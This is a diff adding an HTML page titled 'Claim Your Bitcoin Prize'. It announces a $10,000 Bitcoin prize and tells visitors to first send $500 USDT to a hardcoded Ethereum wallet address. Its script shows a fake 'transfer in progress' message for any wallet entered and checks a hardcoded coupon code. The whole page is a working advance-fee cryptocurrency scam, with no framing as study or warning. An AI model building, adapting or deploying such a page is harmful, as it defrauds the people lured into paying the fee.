@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Your Bitcoin Prize</title>
+    <style>
+        /* Global Styles */
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #1E272E, #34495E);
+            color: white;
+            height: 100%;
+            overflow: auto;
+        }
+
+        /* Grid Layout */
+        .grid-container {
+            display: grid;
+            grid-template-rows: auto auto auto;
+            grid-template-columns: repeat(2, 1fr);
+            height: 100vh;
+            width: 100%;
+            gap: 20px;
+            padding: 20px;
+        }
+
+        .grid-item {
+            background: rgba(44, 62, 80, 0.9);
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            transition: transform 0.3s ease-in-out;
+        }
+
+        .grid-item:hover {
+            transform: scale(1.05);
+        }
+
+        h1, h2 {
+            margin: 0 0 15px;
+            color: #F39C12;
+        }
+
+        p {
+            font-size: 1.2rem;
+            margin-bottom: 15px;
+            line-height: 1.5;
+        }
+
+        .large-text {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #ECF0F1;
+        }
+
+        /* Form and Button Styling */
+        input, button {
+            width: 80%;
+            padding: 15px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.2rem;
+        }
+
+        input {
+            background: #ECF0F1;
+            color: #34495E;
+        }
+
+        button {
+            background: #1ABC9C;
+            color: white;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background: #16A085;
+        }
+
+        /* Copyable Wallet Address */
+        .copyable {
+            background: #34495E;
+            padding: 10px 15px;
+            font-family: monospace;
+            font-size: 1.2rem;
+            color: #00C0F5;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .grid-container {
+                grid-template-rows: repeat(3, auto);
+                grid-template-columns: 1fr;
+            }
+
+            input, button {
+                width: 100%;
+                font-size: 1rem;
+            }
+
+            h1, h2 {
+                font-size: 1.5rem;
+            }
+
+            p {
+                font-size: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="grid-container">
+        <!-- Header Section -->
+        <div class="grid-item">
+            <h1>🎉 Bitcoin Prize: $10,000 🎉</h1>
+            <p class="large-text">Congratulations! Follow the steps below to claim your reward.</p>
+        </div>
+
+        <!-- Step 1: Payment Section -->
+        <div class="grid-item">
+            <h2>Step 1: Send $500 USDT (ERC20)</h2>
+            <p>To claim your prize, send $500 USDT to the following wallet address:</p>
+            <p class="copyable" id="wallet-address">0xf1Da95206AbC1f30b49C4DcAbaeB068029a8EE54</p>
+            <button onclick="copyToClipboard()">Copy Wallet Address</button>
+        </div>
+
+        <!-- Step 2: Bitcoin Wallet Submission -->
+        <div class="grid-item">
+            <h2>Step 2: Submit Your Bitcoin Wallet</h2>
+            <p>Enter your Bitcoin wallet address below to receive your prize:</p>
+            <form id="bitcoin-form" onsubmit="handleBitcoinSubmission(event)">
+                <input type="text" id="bitcoin-wallet" name="bitcoin-wallet" placeholder="Your Bitcoin Wallet Address" required>
+                <button type="submit">Submit Address</button>
+            </form>
+            <p id="submission-result" style="margin-top: 15px; font-size: 1.2rem; font-weight: bold;"></p>
+        </div>
+
+        <!-- Step 3: Prize Verification -->
+        <div class="grid-item">
+            <h2>Verify Prize Withdrawal</h2>
+            <p>Enter your coupon or transaction ID to check if your prize has been claimed:</p>
+            <input type="text" id="coupon-code" placeholder="Enter Coupon/Transaction ID" required>
+            <button onclick="verifyCoupon()">Verify</button>
+            <p id="verification-result" style="margin-top: 15px; font-size: 1.2rem; font-weight: bold;"></p>
+        </div>
+    </div>
+
+    <script>
+        function copyToClipboard() {
+            const walletAddress = document.getElementById('wallet-address').innerText;
+            navigator.clipboard.writeText(walletAddress)
+                .then(() => alert('Wallet address copied to clipboard!'))
+                .catch(err => console.error('Failed to copy: ', err));
+        }
+
+        function handleBitcoinSubmission(event) {
+            event.preventDefault(); // Prevent form submission reload
+            const walletInput = document.getElementById('bitcoin-wallet').value.trim();
+            const resultMessage = document.getElementById('submission-result');
+
+            // Display message regardless of input validity
+            resultMessage.style.color = 'green';
+            resultMessage.textContent = 'The transfer is in progress, please wait only 10 minutes.';
+        }
+
+        function verifyCoupon() {
+            const couponInput = document.getElementById('coupon-code').value.trim();
+            const verificationResult = document.getElementById('verification-result');
+
+            if (couponInput === '1861484107') {
+                verificationResult.style.color = 'green';
+                verificationResult.textContent = 'The card is still working. You can withdraw the money.';
+            } else {
+                verificationResult.style.color = 'red';
+                verificationResult.textContent = 'Invalid coupon or the prize has already been claimed.';
+            }
+        }
+    </script>
+</body>
+</html>
